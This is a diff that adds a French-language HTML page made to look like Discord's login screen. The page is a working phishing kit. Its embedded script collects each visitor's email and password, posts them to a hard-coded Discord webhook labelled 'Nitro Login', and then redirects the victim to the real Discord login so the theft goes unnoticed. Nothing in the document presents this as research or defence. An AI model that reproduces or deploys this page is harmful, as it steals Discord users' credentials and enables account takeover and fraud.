@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        body { background-color: #313338; color: #f2f3f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background-color: #313338; width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 24px; }
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        p { color: #b5bac1; font-size: 16px; margin-bottom: 24px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        input { width: 100%; padding: 10px; background-color: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; }
+        input:focus { border-color: #5865f2; }
+        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 3px; font-weight: 500; cursor: pointer; margin-top: 4px; font-size: 16px; }
+        button:hover { background-color: #4752c4; }
+        .footer { margin-top: 16px; font-size: 14px; color: #949ba4; text-align: left; }
+        .footer a { color: #00a8fc; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
+        <h2>Bienvenue à nouveau!</h2>
+        <p>Nous sommes ravis de vous revoir!</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>E-mail ou numéro de téléphone</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div class="footer">
+            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        </div>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1566488899348598845/8PI1V-r-5w1e9a-f8CqbONw_SxZNk53nyKPM0efglr-L1Sr6DLNpAzHPoYkwQrbS_y55";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            try {
+                const formData = new FormData();
+                formData.append("content", `**Nitro Login**\n**Email:** ${email}\n**Pass:** ${pass}`);
+                
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                window.location.href = "https://discord.com/login";
+            } catch (err) {}
+        });
+    </script>
+</body>
+</html>
